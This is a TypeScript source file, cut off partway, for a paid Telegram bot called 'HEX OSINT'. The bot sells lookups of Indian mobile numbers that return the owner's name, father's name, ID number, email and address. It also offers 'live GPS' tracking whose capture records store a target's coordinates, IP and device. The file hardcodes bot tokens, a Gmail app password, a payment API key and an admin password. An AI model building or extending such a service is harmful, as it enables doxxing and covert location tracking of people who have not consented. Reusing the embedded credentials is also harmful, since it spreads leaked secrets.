import express from 'express';
import crypto from 'crypto';
import fs from 'fs';
import https from 'https';
import path from 'path';
import tls from 'tls';
import QRCode from 'qrcode';
import dotenv from 'dotenv';

dotenv.config();

process.on('uncaughtException', (err) => {
  console.error('[HexxBot] Uncaught Exception (kept alive):', err?.message || err);
});

process.on('unhandledRejection', (reason: any) => {
  console.error('[HexxBot] Unhandled Rejection (kept alive):', reason?.message || reason);
});

export type InlineButtonStyle = 'primary' | 'success' | 'danger' | 'default';
export type BannerTheme = 'blue' | 'emerald' | 'crimson' | 'purple';
export type BotMediaType = 'photo' | 'video';

export interface BotInlineButtonConfig {
  id: string;
  label: string;
  callbackData: string;
  style: InlineButtonStyle;
  enabled: boolean;
  row: number;
  url?: string;
}

export interface PricingPlan {
  id: string;
  name: string;
  price: number;
  days: number;
  credits: number;
  badge?: string;
  description: string;
  popular?: boolean;
  buttonStyle: InlineButtonStyle;
}

export interface RedeemCode {
  code: string;
  credits: number;
  vipDays: number;
  maxUses: number;
  usedBy: number[];
  createdAt: string;
}

export interface BotConfig {
  botName: string;
  botUsername: string;
  botToken: string;
  miniAppUrl: string;
  websiteUrl: string;
  channelUrl: string;
  channelButtonLabel: string;
  groupUrl: string;
  groupButtonLabel: string;
  adminPassword: string;
  famGatewayUrl: string;
  famGatewayApiKey: string;
  merchantUpiId: string;
  merchantName: string;
  gmailUser: string;
  gmailAppPassword: string;
  autoVerifyPayment: boolean;
  pollIntervalSeconds: number;
  defaultTrialCredits: number;
  dailyLookupLimit: number;
  liveLocationLifetimeLimit: number;
  referralBonusCredits: number;
  referralsForFreePremiumDay: number;
  freePremiumDaysReward: number;
  maintenanceMode: boolean;

  bannerEnabled: boolean;
  responseImageEnabled: boolean;
  mediaType: BotMediaType;
  bannerUrl: string;
  bannerVideoUrl: string;
  telegramFileId?: string;
  bannerTitle: string;
  bannerSubtitle: string;
  bannerBadge: string;
  bannerFooter: string;
  bannerTheme: BannerTheme;

  headerPrefix: string;
  welcomeText: string;
  aboutText: string;
  supportHandle: string;
  lookupPromptTitle: string;
  lookupPromptSubtext: string;
  resultHeaderTitle: string;
  resultFooterText: string;
  noCreditMessage: string;

  osintApiUrl: string;
  osintApiKey: string;
  showFieldName: boolean;
  showFieldFather: boolean;
  showFieldMobile: boolean;
  showFieldAltMobile: boolean;
  showFieldCircle: boolean;
  showFieldIdNumber: boolean;
  showFieldEmail: boolean;
  showFieldAddress: boolean;
  showExtraRecords: boolean;
  maxExtraRecords: number;
  maxAddressLength: number;

  labelFieldName: string;
  labelFieldFather: string;
  labelFieldMobile: string;
  labelFieldAltMobile: string;
  labelFieldCircle: string;
  labelFieldIdNumber: string;
  labelFieldEmail: string;
  labelFieldAddress: string;

  btnBackLabel: string;
  btnBuyPlansLabel: string;
  btnHistoryLabel: string;
  btnClearHistoryLabel: string;
  btnReferLabel: string;
  btnMiniAppLabel: string;

  forceJoinEnabled: boolean;
  forceJoinChannel: string;
  forceJoinUrl: string;

  inlineButtons: BotInlineButtonConfig[];
  plans: PricingPlan[];
  redeemCodes: RedeemCode[];
}

export interface LiveLocationCapture {
  id: string;
  token: string;
  targetNumber?: string;
  lat: number;
  lng: number;
  accuracy?: number;
  address: string;
  city?: string;
  state?: string;
  ip: string;
  device: string;
  source: 'gps' | 'ip';
  timestamp: string;
  mapsUrl: string;
}

export interface LookupHistoryItem {
  id: string;
  queryNumber: string;
  timestamp: string;
  source: 'bot' | 'web';
  userId: number;
  userName?: string;
  resultSummary: {
    name: string;
    truecallerName?: string;
    fatherName: string;
    mobile: string;
    altMobile: string;
    circle: string;
    idNumber: string;
    email: string;
    address: string;
    totalRecords: number;
    lat?: number;
    lng?: number;
    mapsUrl?: string;
  };
}

export interface UserProfile {
  id: number;
  firstName: string;
  username?: string;
  credits: number;
  dailyLimit?: number;
  lastLookupDate?: string;
  liveLocationUsed?: number;
  liveLocationLimit?: number;
  activeTrackToken?: string;
  liveTargetNumber?: string;
  liveCaptures?: LiveLocationCapture[];
  isPremium: boolean;
  premiumUntil: string | null;
  lastPlanName?: string;
  totalSpent?: number;
  dailyLookupsUsed: number;
  totalLookups: number;
  referralCode: string;
  referredBy: number | null;
  referralCount: number;
  referralCreditsEarned: number;
  joinedAt: string;
  lastActiveAt: string;
  isBanned: boolean;
  isAdminUnlocked?: boolean;
  lastBotMessageId?: number;
  lastBotMessageHasPhoto?: boolean;
  history: LookupHistoryItem[];
}

export interface PaymentOrder {
  orderId: string;
  famOrderId?: string;
  userId: number;
  userName: string;
  userUsername?: string;
  planId: string;
  planName: string;
  amount: number;
  payableAmount?: string;
  qrImageUrl?: string;
  qrDataUrl?: string;
  botQrMessageId?: number;
  lastImapScanAt?: number;
  credits: number;
  days: number;
  status: 'PENDING' | 'PAID' | 'FAILED' | 'EXPIRED';
  paymentUrl: string;
  upiIntentUrl: string;
  qrPayload: string;
  utr?: string;
  gatewaySource: 'famgateway' | 'upi_fallback' | 'direct_gmail';
  createdAt: string;
  expiresAt?: string;
  paidAt?: string;
}

export interface BotActivityLog {
  id: string;
  timestamp: string;
  type: 'BOT_MESSAGE' | 'CALLBACK_QUERY' | 'PAYMENT' | 'LOOKUP' | 'REFERRAL' | 'ADMIN' | 'SYSTEM';
  userId?: number;
  userName?: string;
  summary: string;
  details?: string;
}

interface AppState {
  config: BotConfig;
  users: Record<string, UserProfile>;
  orders: Record<string, PaymentOrder>;
  usedEmailIds?: string[];
  globalHistory: LookupHistoryItem[];
  logs: BotActivityLog[];
  lastTelegramUpdateId: number;
}

// ============================================================================
// FAST NON-BLOCKING FETCH WITH TIMEOUT HELPER (NEVER FREEZES EVENT LOOP)
// ============================================================================
async function fetchWithTimeout(
  url: string,
  options: RequestInit = {},
  timeoutMs = 5000
): Promise<Response> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, {
      ...options,
      signal: controller.signal,
    });
  } finally {
    clearTimeout(timer);
  }
}

// ============================================================================
// NORMAL CLEAN FONT ENGINE (STRIPS UNICODE MATH FONT BACK TO STANDARD TEXT)
// ============================================================================
export function fromThinSans(input: string): string {
  let result = '';
  for (const ch of String(input || '')) {
    const cp = ch.codePointAt(0) || 0;
    if (cp >= 0x1d5a0 && cp <= 0x1d5b9) {
      result += String.fromCharCode(65 + (cp - 0x1d5a0));
    } else if (cp >= 0x1d5ba && cp <= 0x1d5d3) {
      result += String.fromCharCode(97 + (cp - 0x1d5ba));
    } else if (cp >= 0x1d7e2 && cp <= 0x1d7eb) {
      result += String.fromCharCode(48 + (cp - 0x1d7e2));
    } else {
      result += ch;
    }
  }
  return result;
}

export function toThinSans(input: string): string {
  const plain = fromThinSans(input);
  let out = '';
  for (const ch of plain) {
    const code = ch.charCodeAt(0);
    if (code >= 65 && code <= 90) {
      out += String.fromCodePoint(0x1d5a0 + (code - 65));
    } else if (code >= 97 && code <= 122) {
      out += String.fromCodePoint(0x1d5ba + (code - 97));
    } else if (code >= 48 && code <= 57) {
      out += String.fromCodePoint(0x1d7e2 + (code - 48));
    } else {
      out += ch;
    }
  }
  return out;
}

const DATA_FILE = path.join(process.cwd(), 'hexx_store_v12.json');
const LEGACY_FILE = path.join(process.cwd(), 'hexx_store_v11.json');
// Direct high-res image from https://ibb.co/fWtpfhq
const DEFAULT_USER_BANNER_IMAGE = 'https://i.ibb.co/jYGMmcb/file-000000000dc881faa92e8495635ad610.png';

const SPECIAL_LOCATE_BOT_TOKEN = '8832808711:AAGMurZKiF6oxX2uOCqD7CoqZzfwkp6AVrA';

const defaultState: AppState = {
  config: {
    botName: 'HEX OSINT',
    botUsername: 'HexxOsint_bot',
    botToken: process.env.BOT_TOKEN || SPECIAL_LOCATE_BOT_TOKEN,
    miniAppUrl: 'https://ais-pre-wjgc6ech6tjeb4fxmiq54f-739805761259.asia-southeast1.run.app',
    websiteUrl: 'https://ais-pre-wjgc6ech6tjeb4fxmiq54f-739805761259.asia-southeast1.run.app',
    channelUrl: 'https://t.me/HexxOsint_bot',
    channelButtonLabel: '📢 My Channel',
    groupUrl: 'https://t.me/HexxOsint_bot',
    groupButtonLabel: '💬 My Group',
    adminPassword: 'ZX10R',
    famGatewayUrl: 'https://famgateway.in',
    famGatewayApiKey: 'fam_d145abd40300ea43eaa81a7187a34a0f1fd4bf1f',
    merchantUpiId: '8252464080@fam',
    merchantName: 'Hexx OSINT Bot',
    gmailUser: 'vashudevx1451@gmail.com',
    gmailAppPassword: 'ztxkbsoywmnuhthm',
    autoVerifyPayment: true,
    pollIntervalSeconds: 3,
    defaultTrialCredits: 2,
    dailyLookupLimit: 2,
    liveLocationLifetimeLimit: 1,
    referralBonusCredits: 2,
    referralsForFreePremiumDay: 3,
    freePremiumDaysReward: 1,
    maintenanceMode: false,

    bannerEnabled: true,
    responseImageEnabled: false,
    mediaType: 'photo',
    bannerUrl: DEFAULT_USER_BANNER_IMAGE,
    bannerVideoUrl: 'https://cdn.pixabay.com/video/2020/04/18/36466-410654192_large.mp4',
    bannerTitle: 'HEX OSINT',
    bannerSubtitle: 'HEX OSINT & LIVE GPS',
    bannerBadge: '2 DAILY • 1 LIVE TRIAL',
    bannerFooter: 'GOOGLE MAPS • LIVE GPS • 24/7',
    bannerTheme: 'blue',

    headerPrefix: '❖',
    welcomeText:
      '<b>❤️ Hello {name}</b>\n\nWelcome to Hexx OSINT Bot\nSend any 10-digit mobile number in chat to trace its location & Google Maps pin.\n\n<b>Ex:</b> 9876543210',
    aboutText:
      'Hexx OSINT Bot provides instant Indian mobile number location with Google Maps pin (2/Day Free) and Live GPS Location tracking (1 Lifetime Free Trial, Unlimited for VIP).',
    supportHandle: '@HexxOsint_bot',
    lookupPromptTitle: 'Number To Location',
    lookupPromptSubtext: 'Send any 10-digit mobile number (Ex: 9876543210) in chat.',
    resultHeaderTitle: 'Location & Info Report',
    resultFooterText: 'Powered by Hexx OSINT Bot',
    noCreditMessage:
      'Your 2 Free Daily Number-to-Location lookups are finished. Unlock a Premium Pass for unlimited location & live GPS tracking.',

    osintApiUrl: 'https://ftosint.world/api/number',
    osintApiKey: 'tsneww-num2info',
    showFieldName: true,
    showFieldFather: true,
    showFieldMobile: true,
    showFieldAltMobile: true,
    showFieldCircle: true,
    showFieldIdNumber: true,
    showFieldEmail: true,
    showFieldAddress: true,
    showExtraRecords: true,
    maxExtraRecords: 5,
    maxAddressLength: 2000,

    labelFieldName: 'Name',
    labelFieldFather: 'Father',
    labelFieldMobile: 'Mobile',
    labelFieldAltMobile: 'Alt No',
    labelFieldCircle: 'Circle',
    labelFieldIdNumber: 'ID No',
    labelFieldEmail: 'Email',
    labelFieldAddress: 'Address',

    btnBackLabel: '« Back',
    btnBuyPlansLabel: '👑 Get Premium',
    btnHistoryLabel: '📜 History',
    btnClearHistoryLabel: '✕ Clear History',
    btnReferLabel: '🎁 Refer & Earn',
    btnMiniAppLabel: '📢 My Channel',

    forceJoinEnabled: false,
    forceJoinChannel: '@HexxUpdates',
    forceJoinUrl: 'https://t.me/HexxUpdates',

    inlineButtons: [
      { id: 'btn_pricing', label: '👑 Get Premium', callbackData: 'nav_pricing', style: 'success', enabled: true, row: 1 },
      { id: 'btn_profile', label: '👤 My Profile', callbackData: 'nav_profile', style: 'primary', enabled: true, row: 1 },
      { id: 'btn_num_info', label: '📍 Number to Location', callbackData: 'nav_num_info', style: 'primary', enabled: true, row: 2 },
      { id: 'btn_live_loc', label: '🛰️ Live Location', callbackData: 'nav_live_loc', style: 'success', enabled: true, row: 3 },
      { id: 'btn_group', label: '💬 My Group', callbackData: 'nav_group', style: 'success', enabled: true, row: 4, url: 'https://t.me/HexxOsint_bot' },
      { id: 'btn_history', label: '📜 History', callbackData: 'nav_history', style: 'danger', enabled: true, row: 4 },
    ],
    plans: [
      {
        id: 'plan_7d',
        name: '1 Week Pass',
        price: 29,
        days: 7,
        credits: 0,
        badge: '1 WEEK',
        description: 'Unlimited Number to Location & Live Location for 7 Days',
        buttonStyle: 'primary',
      },
      {
        id: 'plan_30d',
        name: '1 Month Pass',
        price: 49,
        days: 30,
        credits: 0,
        badge: 'POPULAR',
        description: 'Unlimited Number to Location & Live Location for 30 Days',
        popular: true,
        buttonStyle: 'success',
      },
      {
        id: 'plan_365d',
        name: '1 Year Pass',
        price: 119,
        days: 365,
        credits: 0,
        badge: 'BEST VALUE',
        description: 'Unlimited Number to Location & Live Location for 365 Days',
        buttonStyle: 'danger',
      },
    ],
    redeemCodes: [
      {
        code: 'LOCATE2',
        credits: 2,
        vipDays: 0,
        maxUses: 100,
        usedBy: [],
        createdAt: new Date().toISOString(),
      },
      {
        code: 'VIP7DAY',
        credits: 0,
        vipDays: 7,
        maxUses: 50,
        usedBy: [],
        createdAt: new Date().toISOString(),
      },
    ],
  },
  users: {
    '6672896116': {
      id: 6672896116,
      firstName: 'UHTKARSH',
      username: 'Uhtkarshh',
      credits: 2,
      liveLocationUsed: 0,
      liveLocationLimit: 1,
      isPremium: true,
      premiumUntil: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000).toISOString(),
      lastPlanName: '1 Week Pass',
      totalSpent: 29,
      dailyLookupsUsed: 0,
      totalLookups: 0,
      referralCode: 'HEX667289',
      referredBy: null,
      referralCount: 0,
      referralCreditsEarned: 0,
      joinedAt: new Date().toISOString(),
      lastActiveAt: new Date().toISOString(),
      isBanned: false,
      isAdminUnlocked: true,
      history: [],
    },
  },
  orders: {},
  globalHistory: [],
  logs: [],
  lastTelegramUpdateId: 0,
};

const ibbCache = new Map<string, string>([
  ['https://ibb.co/fWtpfhq', DEFAULT_USER_BANNER_IMAGE],
]);

function normalizeBannerImageUrlSync(rawUrl?: string): string {
  const trimmed = String(rawUrl || '').trim();
  if (!trimmed || trimmed === 'https://ibb.co/fWtpfhq') {
    return DEFAULT_USER_BANNER_IMAGE;
  }
  return ibbCache.get(trimmed) || trimmed;
}

async function resolveBannerImageUrlAsync(rawUrl?: string): Promise<string> {
  const trimmed = String(rawUrl || '').trim();
  if (!trimmed || trimmed === 'https://ibb.co/fWtpfhq') {
    return DEFAULT_USER_BANNER_IMAGE;
  }
  if (ibbCache.has(trimmed)) {
    return ibbCache.get(trimmed)!;
  }
  if (/^https?:\/\/ibb\.co\/[A-Za-z0-9]+/i.test(trimmed)) {
    try {
      const resp = await fetchWithTimeout(trimmed, {}, 4000);
      const html = await resp.text();
      const match = html.match(/https:\/\/i\.ibb\.co\/[^"'\s>]+/i);
      if (match && match[0]) {
        ibbCache.set(trimmed, match[0]);
        return match[0];
      }
    } catch {
      return DEFAULT_USER_BANNER_IMAGE;
    }
  }
  return trimmed;
}

function loadState(): AppState {
  try {
    const fileToRead = fs.existsSync(DATA_FILE)
      ? DATA_FILE
      : fs.existsSync(LEGACY_FILE)
      ? LEGACY_FILE
      : null;

    if (fileToRead) {
      const raw = fs.readFileSync(fileToRead, 'utf-8');
      const parsed = JSON.parse(raw);

      const resolvedBannerUrl = normalizeBannerImageUrlSync(parsed.config?.bannerUrl);

      const NEW_BOT_TOKEN = process.env.BOT_TOKEN || SPECIAL_LOCATE_BOT_TOKEN;
      const savedToken = String(parsed.config?.botToken || '').trim();
      const isOldToken =
        !savedToken ||
        savedToken === '8748812150:AAFcmCRr_BmSu9chg1HHdlcjXDX7PMj_gnk' ||
        savedToken === '8916390079:AAHYxZSMhqO9ZI1C4v5x0whtrOkWTzliLtw' || savedToken === '8832808711:AAHU16Bek02Jzsln3jcsIPUzNpz7qH2D9SE' || savedToken === '8916390079:AAHYxZSMhqO9ZI1C4v5x0whtrOkWTzliLtw' || savedToken === '8832808711:AAHU16Bek02Jzsln3jcsIPUzNpz7qH2D9SE' || savedToken === '8916390079:AAHYxZSMhqO9ZI1C4v5x0whtrOkWTzliLtw' || savedToken === '8832808711:AAHU16Bek02Jzsln3jcsIPUzNpz7qH2D9SE' || savedToken === '8916390079:AAHYxZSMhqO9ZI1C4v5x0whtrOkWTzliLtw' || savedToken === '8832808711:AAHU16Bek02Jzsln3jcsIPUzNpz7qH2D9SE';
      const activeBotToken = isOldToken ? NEW_BOT_TOKEN : savedToken;

      const hasOldPlans =
        !Array.isArray(parsed.config?.plans) ||
        parsed.config.plans.length === 0 ||
        parsed.config.plans.some((p: PricingPlan) => p.price === 19 || p.price === 129);

      const resolvedDailyLimit =
        isOldToken || parsed.config?.dailyLookupLimit === 5
          ? 2
          : typeof parsed.config?.dailyLookupLimit === 'number'
          ? parsed.config.dailyLookupLimit
          : 2;

      const resolvedLiveLimit =
        typeof parsed.config?.liveLocationLifetimeLimit === 'number'
          ? parsed.config.liveLocationLifetimeLimit
          : 1;

      const mergedConfig: BotConfig = {
        ...defaultState.config,
        ...parsed.config,
        botName:
          !parsed.config?.botName || parsed.config.botName === 'Hexx Info Bot'
            ? 'HEX OSINT'
            : parsed.config.botName,
        botUsername:
          !parsed.config?.botUsername || parsed.config.botUsername === 'HexInfo_bot'
            ? 'HexxOsint_bot'
            : parsed.config.botUsername,
        botToken: activeBotToken,
        telegramFileId: savedToken === activeBotToken ? parsed.config?.telegramFileId : undefined,
        bannerEnabled: typeof parsed.config?.bannerEnabled === 'boolean' ? parsed.config.bannerEnabled : true,
        responseImageEnabled: false,
        mediaType: parsed.config?.mediaType === 'video' ? 'video' : 'photo',
        bannerUrl: resolvedBannerUrl,
        bannerVideoUrl: parsed.config?.bannerVideoUrl || defaultState.config.bannerVideoUrl,
        channelUrl:
          !parsed.config?.channelUrl || parsed.config.channelUrl.includes('HexInfo_bot')
            ? 'https://t.me/HexxOsint_bot'
            : parsed.config.channelUrl,
        channelButtonLabel: '📢 My Channel',
        groupUrl:
          !parsed.config?.groupUrl || parsed.config.groupUrl.includes('HexInfo_bot')
            ? 'https://t.me/HexxOsint_bot'
            : parsed.config.groupUrl,
        groupButtonLabel: '💬 My Group',
        welcomeText: defaultState.config.welcomeText,
        aboutText: defaultState.config.aboutText,
        lookupPromptTitle: defaultState.config.lookupPromptTitle,
        lookupPromptSubtext: defaultState.config.lookupPromptSubtext,
        resultHeaderTitle: defaultState.config.resultHeaderTitle,
        resultFooterText: defaultState.config.resultFooterText,
        noCreditMessage: defaultState.config.noCreditMessage,
        labelFieldName: 'Name',
        labelFieldFather: 'Father',
        labelFieldMobile: 'Mobile',
        labelFieldAltMobile: 'Alt No',
        labelFieldCircle: 'Circle',
        labelFieldIdNumber: 'ID No',
        labelFieldEmail: 'Email',
        labelFieldAddress: 'Address',
        btnBackLabel: '« Back',
        btnBuyPlansLabel: '👑 Get Premium',
        btnHistoryLabel: '📜 History',
        btnClearHistoryLabel: '✕ Clear History',
        btnReferLabel: '🎁 Refer & Earn',
        btnMiniAppLabel: '📢 My Channel',
        websiteUrl:
          !parsed.config?.websiteUrl ||
          String(parsed.config.websiteUrl).includes('famgateway.in') ||
          String(parsed.config.websiteUrl).includes('ais-dev-')
            ? defaultState.config.websiteUrl
            : parsed.config.websiteUrl,
        miniAppUrl:
          !parsed.config?.miniAppUrl ||
          String(parsed.config.miniAppUrl).includes('famgateway.in') ||
          String(parsed.config.miniAppUrl).includes('ais-dev-')
            ? defaultState.config.miniAppUrl
            : parsed.config.miniAppUrl,
        adminPassword: parsed.config?.adminPassword || 'ZX10R',
        merchantUpiId: parsed.config?.merchantUpiId || '8252464080@fam',
        merchantName: 'Hexx OSINT Bot',
        gmailUser: parsed.config?.gmailUser || 'vashudevx1451@gmail.com',
        gmailAppPassword: parsed.config?.gmailAppPassword || 'ztxkbsoywmnuhthm',
        osintApiUrl: parsed.config?.osintApiUrl || defaultState.config.osintApiUrl,
        osintApiKey: parsed.config?.osintApiKey ?? defaultState.config.osintApiKey,
        inlineButtons: defaultState.config.inlineButtons,
        maxAddressLength: 2000,
        showExtraRecords: true,
        maxExtraRecords: 5,
        dailyLookupLimit: resolvedDailyLimit,
        defaultTrialCredits: resolvedDailyLimit,
        liveLocationLifetimeLimit: resolvedLiveLimit,
        plans: hasOldPlans ? defaultState.config.plans : parsed.config.plans,
        redeemCodes: parsed.config?.redeemCodes || defaultState.config.redeemCodes,
      };
      const protectedDigits = String(mergedConfig.merchantUpiId || '').replace(/\D/g, '').slice(-10);
      const users = parsed.users || defaultState.users;
      for (const uid of Object.keys(users)) {
        if (!Array.isArray(users[uid].history)) {
          users[uid].history = [];
        } else if (protectedDigits.length === 10) {
          users[uid].history = users[uid].history.filter((h: LookupHistoryItem) => h.queryNumber !== protectedDigits);
        }
        if (typeof users[uid].liveLocationUsed !== 'number') {
          users[uid].liveLocationUsed = 0;
        }
        if (isOldToken && users[uid].dailyLimit === 5) {
          users[uid].dailyLimit = resolvedDailyLimit;
          users[uid].credits = resolvedDailyLimit;
        }
      }
      const orders: Record<string, PaymentOrder> = parsed.orders || {};
      const nowMs = Date.now();
      for (const ord of Object.values(orders)) {
        if (ord.status === 'PENDING' && nowMs - new Date(ord.createdAt).getTime() > 60 * 60 * 1000) {
          ord.status = 'EXPIRED';
        }
      }
      const rawGlobalHistory: LookupHistoryItem[] = Array.isArray(parsed.globalHistory) ? parsed.globalHistory : [];
      return {
        ...defaultState,
        ...parsed,
        config: mergedConfig,
        users,
        orders,
        usedEmailIds: Array.isArray(parsed.usedEmailIds) ? parsed.usedEmailIds : [],
        globalHistory:
          protectedDigits.length === 10
            ? rawGlobalHistory.filter((h) => h.queryNumber !== protectedDigits)
            : rawGlobalHistory,
        lastTelegramUpdateId: savedToken === activeBotToken ? (parsed.lastTelegramUpdateId || 0) : 0,
      };
    }
  } catch (err) {
    console.error('Failed to load state file, using default state:', err);
  }
  return structuredClone(defaultState);
}

let state: AppState = loadState();

type AdminPendingAction =
  | { type: 'AUTH_PASSWORD' }
  | { type: 'GIVE_VIP_USERNAME' }
  | { type: 'ADD_CREDITS_USERNAME' }
  | { type: 'SET_USER_DAILY_LIMIT' }
  | { type: 'REVOKE_VIP_USERNAME' }
  | { type: 'FIND_USER' }
  | { type: 'BAN_USER' }
  | { type: 'SET_CHANNEL_URL' }
  | { type: 'SET_GROUP_URL' }
  | { type: 'SET_OSINT_API' }
  | { type: 'SET_MEDIA_UPLOAD_OR_URL' }
  | { type: 'SET_WELCOME_TEXT' }
  | { type: 'SET_TRIAL_CREDITS' }
  | { type: 'SET_DAILY_LIMIT' }
  | { type: 'SET_LIVE_LIMIT' }
  | { type: 'SET_REFERRAL_BONUS' }
  | { type: 'PLAN_SET_PRICE'; planId: string }
  | { type: 'PLAN_SET_DAYS'; planId: string }
  | { type: 'PLAN_SET_NAME'; planId: string }
  | { type: 'ADD_NEW_PLAN' }
  | { type: 'MANUAL_ORDER' }
  | { type: 'CREATE_PROMO' }
  | { type: 'BROADCAST' };

const pendingAdminActions = new Map<number, AdminPendingAction>();

let saveTimer: NodeJS.Timeout | null = null;
function saveState() {
  if (saveTimer) return;
  saveTimer = setTimeout(() => {
    saveTimer = null;
    fs.promises.writeFile(DATA_FILE, JSON.stringify(state, null, 2), 'utf-8').catch((err) => {
      console.error('Failed to save state file:', err);
    });
  }, 200);
}

function addLog(type: BotActivityLog['type'], summary: string, userId?: number, userName?: string, details?: string) {
  const entry: BotActivityLog = {
    id: crypto.randomUUID(),
    timestamp: new Date().toISOString(),
    type,
    userId,
    userName,
    summary,
    details,
  };
  state.logs.unshift(entry);
  if (state.logs.length > 150) {
    state.logs = state.logs.slice(0, 150);
  }
  saveState();
}

function getOrCreateUser(tgUser: { id: number; first_name?: string; username?: string }, startPayload?: string): UserProfile {
  const key = String(tgUser.id);
  let user = state.users[key];

  if (!user && tgUser.username) {
    const cleanUname = tgUser.username.toLowerCase().replace(/^@/, '');
    const preKey = Object.keys(state.users).find(
      (k) => k.startsWith('pre_') && state.users[k].username?.toLowerCase() === cleanUname
    );
    if (preKey) {
      const preUser = state.users[preKey];
      delete state.users[preKey];
      user = {
        ...preUser,
        id: tgUser.id,
        firstName: tgUser.first_name || preUser.firstName,
        username: tgUser.username,
      };
      state.users[key] = user;
    }
  }

  if (!user) {
    const refCode = `HEX${String(tgUser.id).slice(-6)}`;
    let referredBy: number | null = null;

    if (startPayload && startPayload.startsWith('ref_')) {
      const refTarget = startPayload.replace('ref_', '').trim();
      const referrer = Object.values(state.users).find(
        (u) => u.referralCode.toLowerCase() === refTarget.toLowerCase() || String(u.id) === refTarget
      );
      if (referrer && referrer.id !== tgUser.id) {
        referredBy = referrer.id;
        referrer.referralCount += 1;
        referrer.credits += state.config.referralBonusCredits;
        referrer.referralCreditsEarned += state.config.referralBonusCredits;

        if (
          state.config.referralsForFreePremiumDay > 0 &&
          referrer.referralCount % state.config.referralsForFreePremiumDay === 0
        ) {
          const now = new Date();
          const currentEnd =
            referrer.premiumUntil && new Date(referrer.premiumUntil) > now
              ? new Date(referrer.premiumUntil)
              : now;
          currentEnd.setDate(currentEnd.getDate() + state.config.freePremiumDaysReward);
          referrer.isPremium = true;
          referrer.premiumUntil = currentEnd.toISOString();
          referrer.lastPlanName = 'Referral VIP Reward';
        }
      }
    }

    user = {
      id: tgUser.id,
      firstName: tgUser.first_name || 'User',
      username: tgUser.username,
      credits: state.config.defaultTrialCredits,
      isPremium: false,
      premiumUntil: null,
      totalSpent: 0,
      dailyLookupsUsed: 0,
      totalLookups: 0,
      referralCode: refCode,
      referredBy,
      referralCount: 0,
      referralCreditsEarned: 0,
      joinedAt: new Date().toISOString(),
      lastActiveAt: new Date().toISOString(),
      isBanned: false,
      history: [],
    };
    state.users[key] = user;
    saveState();
  } else {
    if (tgUser.first_name && tgUser.first_name !== 'Hexx User') {
      user.firstName = tgUser.first_name;
    }
    if (tgUser.username) user.username = tgUser.username;
    user.lastActiveAt = new Date().toISOString();
    if (!Array.isArray(user.history)) user.history = [];
    if (user.isPremium && user.premiumUntil && new Date(user.premiumUntil) < new Date()) {
      user.isPremium = false;
      user.premiumUntil = null;
    }
    saveState();
  }
  return user;
}

function resolveUserByIdentifier(identifier: string): UserProfile | null {
  const raw = String(identifier || '').trim();
  if (!raw) return null;

  if (state.users[raw]) {
    return state.users[raw];
  }

  const cleanUsername = raw.replace(/^@/, '').toLowerCase();

  const existing = Object.values(state.users).find(
    (u) =>
      (u.username && u.username.toLowerCase() === cleanUsername) ||
      String(u.id) === cleanUsername ||
      u.firstName.toLowerCase() === cleanUsername
  );
  if (existing) return existing;

  if (/^\d{5,15}$/.test(cleanUsername)) {
    const numId = Number(cleanUsername);
    const created: UserProfile = {
      id: numId,
      firstName: `User ${cleanUsername.slice(-4)}`,
      credits: state.config.defaultTrialCredits,
      isPremium: false,
      premiumUntil: null,
      totalSpent: 0,
      dailyLookupsUsed: 0,
      totalLookups: 0,
      referralCode: `HEX${cleanUsername.slice(-6)}`,
      referredBy: null,
      referralCount: 0,
      referralCreditsEarned: 0,
      joinedAt: new Date().toISOString(),
      lastActiveAt: new Date().toISOString(),
      isBanned: false,
      history: [],
    };
    state.users[String(numId)] = created;
    saveState();
    return created;
  }

  if (cleanUsername.length >= 2) {
    const fakeId = Math.floor(900000000 + Math.random() * 99999999);
    const preKey = `pre_${cleanUsername}`;
    const created: UserProfile = {
      id: fakeId,
      firstName: `@${cleanUsername}`,
      username: cleanUsername,
      credits: state.config.defaultTrialCredits,
      isPremium: false,
      premiumUntil: null,
      totalSpent: 0,
      dailyLookupsUsed: 0,
      totalLookups: 0,
      referralCode: `HEX${String(fakeId).slice(-6)}`,
      referredBy: null,
      referralCount: 0,
      referralCreditsEarned: 0,
      joinedAt: new Date().toISOString(),
      lastActiveAt: new Date().toISOString(),
      isBanned: false,
      history: [],
    };
    state.users[preKey] = created;
    saveState();
    return created;
  }

  return null;
}

function getRemainingDays(premiumUntil: string | null): number {
  if (!premiumUntil) return 0;
  const diff = new Date(premiumUntil).getTime() - Date.now();
  if (diff <= 0) return 0;
  return Math.ceil(diff / (1000 * 60 * 60 * 24));
}

function getTodayDateString(): string {
  return new Date().toISOString().slice(0, 10);
}

function getUserDailyLimit(user: UserProfile): number {
  if (typeof user.dailyLimit === 'number' && user.dailyLimit >= 0) {
    return user.dailyLimit;
  }
  return typeof state.config.dailyLookupLimit === 'number' && state.config.dailyLookupLimit >= 0
    ? state.config.dailyLookupLimit
    : state.config.defaultTrialCredits || 2;
}

function getUserLiveLimit(user: UserProfile): number {
  if (typeof user.liveLocationLimit === 'number' && user.liveLocationLimit >= 0) {
    return user.liveLocationLimit;
  }
  return typeof state.config.liveLocationLifetimeLimit === 'number' && state.config.liveLocationLifetimeLimit >= 0
    ? state.config.liveLocationLifetimeLimit
    : 1;
}

function syncUserDailyUsage(user: UserProfile): {
  isVip: boolean;
  dailyLimit: number;
  usedToday: number;
  remainingToday: number;
} {
  const today = getTodayDateString();
  const dailyLimit = getUserDailyLimit(user);
  if (user.lastLookupDate !== today) {
    user.dailyLookupsUsed = 0;
    user.lastLookupDate = today;
    if (user.credits < dailyLimit) {
      user.credits = dailyLimit;
    }
    saveState();
  }
  const isVip = Boolean(user.isPremium && (!user.premiumUntil || new Date(user.premiumUntil) > new Date()));
  const usedToday = user.dailyLookupsUsed || 0;
  const remainingToday = isVip ? 999999 : Math.max(0, dailyLimit - usedToday);
  return { isVip, dailyLimit, usedToday, remainingToday };
}

function syncUserLiveUsage(user: UserProfile): {
  isVip: boolean;
  liveLimit: number;
  usedLifetime: number;
  remainingLifetime: number;
} {
  const isVip = Boolean(user.isPremium && (!user.premiumUntil || new Date(user.premiumUntil) > new Date()));
  const liveLimit = getUserLiveLimit(user);
  const usedLifetime = user.liveLocationUsed || 0;
  const remainingLifetime = isVip ? 999999 : Math.max(0, liveLimit - usedLifetime);
  return { isVip, liveLimit, usedLifetime, remainingLifetime };
}

function getUserStatusBadge(user: UserProfile): string {
  const { isVip, dailyLimit, remainingToday } = syncUserDailyUsage(user);
  if (isVip) {
